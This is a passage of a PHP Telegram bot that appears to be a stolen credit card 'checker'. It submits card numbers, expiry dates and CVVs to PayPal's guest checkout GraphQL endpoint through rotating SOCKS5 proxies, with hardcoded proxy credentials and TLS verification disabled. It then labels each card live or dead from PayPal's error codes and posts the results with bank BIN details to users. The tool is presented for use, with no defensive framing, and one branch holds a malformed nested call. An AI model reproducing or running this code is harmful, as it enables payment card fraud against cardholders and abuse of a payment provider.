$headers[] = 'path: /smart/card-fields?sessionID=uid_6dcaad7bb7_mta6ntu6mzy&buttonSessionID=uid_12a7c56fda_mta6ntg6mde&locale.x=en_US&commit=true&env=production&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVVFU2Q1ZENQN0ZtY1puekI3djMyVUlvLWdHZ25KdXB2ZGZMbGU5VEJKd09DNG5lQUNRaERWT05CdjNoYzFXLXBYbFhTNkctS0E1eTRLenYmY3VycmVuY3k9VVNEJm1lcmNoYW50LWlkPVVIQUxaMjI0NUVEVjYmY29tbWl0PXRydWUmY29tcG9uZW50cz1idXR0b25zLG1lc3NhZ2VzJmludGVudD1jYXB0dXJlJmxvY2FsZT1lbl9VUyIsImF0dHJzIjp7ImRhdGEtdWlkIjoidWlkX2JuamRzZWh0bHJha2pkbGZpc3pmdmRoeGFlZXF0cCJ9fQ&disable-card=&token=EC-3NT75172S6225680U';
$headers[] = 'scheme: https';
$headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'referer: https://www.paypal.com/smart/buttons?style.label=checkout&style.layout=vertical&style.color=gold&style.shape=rect&style.tagline=false&style.height=45&components.0=buttons&components.1=messages&locale.lang=en&locale.country=US&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVVFU2Q1ZENQN0ZtY1puekI3djMyVUlvLWdHZ25KdXB2ZGZMbGU5VEJKd09DNG5lQUNRaERWT05CdjNoYzFXLXBYbFhTNkctS0E1eTRLenYmY3VycmVuY3k9VVNEJm1lcmNoYW50LWlkPVVIQUxaMjI0NUVEVjYmY29tbWl0PXRydWUmY29tcG9uZW50cz1idXR0b25zLG1lc3NhZ2VzJmludGVudD1jYXB0dXJlJmxvY2FsZT1lbl9VUyIsImF0dHJzIjp7ImRhdGEtdWlkIjoidWlkX2JuamRzZWh0bHJha2pkbGZpc3pmdmRoeGFlZXF0cCJ9fQ&clientID=AUESd5dCP7FmcZnzB7v32UIo-gGgnJupvdfLle9TBJwOC4neACQhDVONBv3hc1W-pXlXS6G-KA5y4Kzv&sdkCorrelationID=f53694928f373&storageID=uid_36f9fe73ae_mta6ntu6mzy&sessionID=uid_6dcaad7bb7_mta6ntu6mzy&buttonSessionID=uid_12a7c56fda_mta6ntg6mde&env=production&fundingEligibility=eyJwYXlwYWwiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sInBheWxhdGVyIjp7ImVsaWdpYmxlIjp0cnVlLCJtZXJjaGFudENvbmZpZ0hhc2giOiIzZjBjZTQyY2I4M2FiZmRhY2NhYzM0NmNmMmM3YmNhYTMzNDE1MGRlIiwicHJvZHVjdHMiOnsicGF5SW40Ijp7ImVsaWdpYmxlIjpmYWxzZSwidmFyaWFudCI6bnVsbH0sInBheWxhdGVyIjp7ImVsaWdpYmxlIjp0cnVlLCJ2YXJpYW50IjpudWxsfX19LCJjYXJkIjp7ImVsaWdpYmxlIjp0cnVlLCJicmFuZGVkIjpmYWxzZSwiaW5zdGFsbG1lbnRzIjpmYWxzZSwidmVuZG9ycyI6eyJ2aXNhIjp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJtYXN0ZXJjYXJkIjp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJhbWV4Ijp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJkaXNjb3ZlciI6eyJlbGlnaWJsZSI6dHJ1ZSwidmF1bHRhYmxlIjp0cnVlfSwiaGlwZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOmZhbHNlfSwiZWxvIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfSwiamNiIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfX0sImd1ZXN0RW5hYmxlZCI6dHJ1ZX0sInZlbm1vIjp7ImVsaWdpYmxlIjpmYWxzZX0sIml0YXUiOnsiZWxpZ2libGUiOmZhbHNlfSwiY3JlZGl0Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImFwcGxlcGF5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sInNlcGEiOnsiZWxpZ2libGUiOmZhbHNlfSwiaWRlYWwiOnsiZWxpZ2libGUiOmZhbHNlfSwiYmFuY29udGFjdCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJnaXJvcGF5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImVwcyI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJzb2ZvcnQiOnsiZWxpZ2libGUiOmZhbHNlfSwibXliYW5rIjp7ImVsaWdpYmxlIjpmYWxzZX0sInAyNCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJ6aW1wbGVyIjp7ImVsaWdpYmxlIjpmYWxzZX0sIndlY2hhdHBheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJwYXl1Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImJsaWsiOnsiZWxpZ2libGUiOmZhbHNlfSwidHJ1c3RseSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJveHhvIjp7ImVsaWdpYmxlIjpmYWxzZX0sIm1heGltYSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJib2xldG8iOnsiZWxpZ2libGUiOmZhbHNlfSwibWVyY2Fkb3BhZ28iOnsiZWxpZ2libGUiOmZhbHNlfX0&platform=desktop&experiment.enableVenmo=false&experiment.disablePaylater=false&flow=purchase&currency=USD&intent=capture&commit=true&vault=false&merchantID.0=UHALZ2245EDV6&renderedButtons.0=paypal&renderedButtons.1=paylater&renderedButtons.2=card&debug=false&applePaySupport=false&supportsPopups=true&supportedNativeBrowser=false&allowBillingPayments=true';
$headers[] = 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"';
$headers[] = 'sec-ch-ua-mobile: ?0';
$headers[] = 'sec-ch-ua-platform: "Windows"';
$headers[] = 'sec-fetch-dest: iframe';
$headers[] = 'sec-fetch-mode: navigate';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'upgrade-insecure-requests: 1';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'sessionID=uid_6dcaad7bb7_mta6ntu6mzy&buttonSessionID=uid_12a7c56fda_mta6ntg6mde&locale.x=en_US&commit=true&env=production&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVVFU2Q1ZENQN0ZtY1puekI3djMyVUlvLWdHZ25KdXB2ZGZMbGU5VEJKd09DNG5lQUNRaERWT05CdjNoYzFXLXBYbFhTNkctS0E1eTRLenYmY3VycmVuY3k9VVNEJm1lcmNoYW50LWlkPVVIQUxaMjI0NUVEVjYmY29tbWl0PXRydWUmY29tcG9uZW50cz1idXR0b25zLG1lc3NhZ2VzJmludGVudD1jYXB0dXJlJmxvY2FsZT1lbl9VUyIsImF0dHJzIjp7ImRhdGEtdWlkIjoidWlkX2JuamRzZWh0bHJha2pkbGZpc3pmdmRoeGFlZXF0cCJ9fQ&disable-card=&token='.$token.'');
$get3 = curl_exec($ch);


//==============[ 1st req ]==============//
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
            curl_setopt($ch, CURLOPT_PROXY, $proxy[array_rand($proxy)]);
            curl_setopt($ch, CURLOPT_PROXYUSERPWD, "sfbnu0lx-3nzx7fk:exqwdzhv32");
curl_setopt($ch, CURLOPT_URL, 'https://www.paypal.com/graphql?fetch_credit_form_submit');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'authority: www.paypal.com';
$headers[] = 'method: POST';
$headers[] = 'path: /graphql?fetch_credit_form_submit';
$headers[] = 'scheme: https';
$headers[] = 'accept: */*';
$headers[] = 'accept-language: en-US,en;q=0.9,hi;q=0.8,bn;q=0.7';
$headers[] = 'content-type: application/json';
$headers[] = 'origin: https://www.paypal.com';
$headers[] = 'paypal-client-context: '.$token.'';
$headers[] = 'paypal-client-metadata-id: '.$token.'';
$headers[] = 'referer: https://www.paypal.com/smart/card-fields?sessionID=uid_0580164318_mta6mzk6nte&buttonSessionID=uid_6dc1213f73_mta6nda6nde&locale.x=en_US&commit=true&env=production&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVVFU2Q1ZENQN0ZtY1puekI3djMyVUlvLWdHZ25KdXB2ZGZMbGU5VEJKd09DNG5lQUNRaERWT05CdjNoYzFXLXBYbFhTNkctS0E1eTRLenYmY3VycmVuY3k9VVNEJm1lcmNoYW50LWlkPVVIQUxaMjI0NUVEVjYmY29tbWl0PXRydWUmY29tcG9uZW50cz1idXR0b25zLG1lc3NhZ2VzJmludGVudD1jYXB0dXJlJmxvY2FsZT1lbl9VUyIsImF0dHJzIjp7ImRhdGEtdWlkIjoidWlkX2JuamRzZWh0bHJha2pkbGZpc3pmdmRoeGFlZXF0cCJ9fQ&disable-card=&token=EC-5FS8055486889604B';
$headers[] = 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"';
$headers[] = 'sec-ch-ua-mobile: ?0';
$headers[] = 'sec-ch-ua-platform: "Windows"';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'sec-gpc: 1';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36';
$headers[] = 'x-app-name: standardcardfields';
$headers[] = 'x-country: US';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"query":"\n        mutation payWithCard(\n            $token: String!\n            $card: CardInput!\n            $phoneNumber: String\n            $firstName: String\n            $lastName: String\n            $shippingAddress: AddressInput\n            $billingAddress: AddressInput\n            $email: String\n            $currencyConversionType: CheckoutCurrencyConversionType\n            $installmentTerm: Int\n        ) {\n            approveGuestPaymentWithCreditCard(\n                token: $token\n                card: $card\n                phoneNumber: $phoneNumber\n                firstName: $firstName\n                lastName: $lastName\n                email: $email\n                shippingAddress: $shippingAddress\n                billingAddress: $billingAddress\n                currencyConversionType: $currencyConversionType\n                installmentTerm: $installmentTerm\n            ) {\n                flags {\n                    is3DSecureRequired\n                }\n                cart {\n                    intent\n                    cartId\n                    buyer {\n                        userId\n                        auth {\n                            accessToken\n                        }\n                    }\n                    returnUrl {\n                        href\n                    }\n                }\n                paymentContingencies {\n                    threeDomainSecure {\n                        status\n                        method\n                        redirectUrl {\n                            href\n                        }\n                        parameter\n                    }\n                }\n            }\n        }\n        ","variables":{"token":"'.$token.'","card":{"cardNumber":"'.$cc.'","expirationDate":"'.$mm.'/'.$yyyy.'","postalCode":"10080","securityCode":"'.$cvv.'"},"phoneNumber":"4139290139","firstName":"Gey","lastName":"Paypal","billingAddress":{"givenName":"Gey","familyName":"Paypal","line1":null,"line2":null,"city":null,"state":null,"postalCode":"10080","country":"US"},"email":"'.$email.'","currencyConversionType":"PAYPAL"},"operationName":null}');
$curl1 = curl_exec($ch);

//Trimming The Response
$error = trim(strip_tags(getStr($curl1,'"code":"','"')));

$msg = trim(strip_tags(getStr($curl1,'"message":"','"')));
$info = curl_getinfo($ch);
$time = $info['total_time'];
$time = substr_replace($time, '',4);
curl_close($ch);

echo "<b><i>Response: $error</b></i><br>";

//echo "<b><i>Message: $msg</b></i><br>";

//echo "<b><i>Token: $token</b></i><br>";

            

######################END OF CHECKER PART################################################################################
            
            
            if(substr_count($curl1, '"INVALID_BILLING_ADDRESS"')) {
              addTotal();
              addUserTotal($userId);
              addCVV();
              addUserCVV($userId);
              addCCN();
              addUserCCN($userId);
              bot('editMessageText',[
                'chat_id'=>$chat_id,
                'message_id'=>$messageidtoedit,
                'text'=>"<b>Card:</b> <code>$lista</code>
<b>Status -» CVV Matched [ AVS FAILURE ] ✅
Response -» Approved ( INVALID_BILLING_ADDRESS )
Gateway -» Paypal
IP -» Proxy [$ip] 
Time -» <b>$time</b><b>s</b>

------- Bin Info -------</b>
<b>Bank -»</b> $bank
<b>Brand -»</b> $schemename
<b>Type -»</b> $typename
<b>Currency -»</b> $currency
<b>Country -»</b> $cname ($emoji - 💲$currency)
<b>Issuers Contact -»</b> $phone
<b>----------------------------</b>

<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
<b>Bot By: <a href='t.me/Arceus69_Xd'>[ ＡＲＣ Σ ＵＳ </Oғғʟɪɴᴇ> ]</a></b>",
                'parse_mode'=>'html',
                'disable_web_page_preview'=>'true'
                
            ]);}
        
              elseif(substr_count($curl1, 'EXISTING_ACCOUNT_RESTRICTED')) {
                addTotal();
                addUserTotal($userId);
                bot('editMessageText',[
                  'chat_id'=>$chat_id,
                  'message_id'=>$messageidtoedit,
                  bot('editMessageText',[
                    'chat_id'=>$chat_id,
                    'message_id'=>$messageidtoedit,
                    'text'=>"<b>Card:</b> <code>$lista</code>
    <b>Status -» CVV Matched [Card Already Added To Another] ✅
    Response -» Approved (EXISTING_ACCOUNT_RESTRICTED)
    Gateway -» Paypal
    IP -» Proxy [$ip] 
    Time -» <b>$time</b><b>s</b>
  
  ------- Bin Info -------</b>
  <b>Bank -»</b> $bank
  <b>Brand -»</b> $schemename
  <b>Type -»</b> $typename
  <b>Currency -»</b> $currency
  <b>Country -»</b> $cname ($emoji - 💲$currency)
  <b>Issuers Contact -»</b> $phone
  <b>----------------------------</b>
  
  <b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
  <b>Bot By: <a href='t.me/Mabidax_The_Lost_Noob'>Mabidax</a></b>",
                  'parse_mode'=>'html',
                  'disable_web_page_preview'=>'true'
                  
              ]);}

              else{
                addTotal();
                addUserTotal($userId);
                bot('editMessageText',[
                  'chat_id'=>$chat_id,
                  'message_id'=>$messageidtoedit,
                  'text'=>"<b>Card:</b> <code>$lista</code>
  <b>Status -» Dead ❌
  Response -» $error
  Gateway -» Paypal
  Time -» <b>$time</b><b>s</b>
  
  ------- Bin Info -------</b>
  <b>Bank -»</b> $bank
  <b>Brand -»</b> $schemename
  <b>Type -»</b> $typename
  <b>Currency -»</b> $currency
  <b>Country -»</b> $cname ($emoji - 💲$currency)
  <b>Issuers Contact -»</b> $phone
  <b>----------------------------</b>
  
  <b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
  <b>Bot By: <a href='t.me/Mabidax_The_Lost_Noob'>Mabidax</a></b>",
                  'parse_mode'=>'html',
                  'disable_web_page_preview'=>'true'
                  
              ]);}
            
        }else{
          bot('editMessageText',[
              'chat_id'=>$chat_id,
              'message_id'=>$messageidtoedit,
              'text'=>"<b>Cool! Fucking provide a CC to Check!!</b>",
              'parse_mode'=>'html',
              'disable_web_page_preview'=>'true'
              
          ]);
      }
    }
}


?>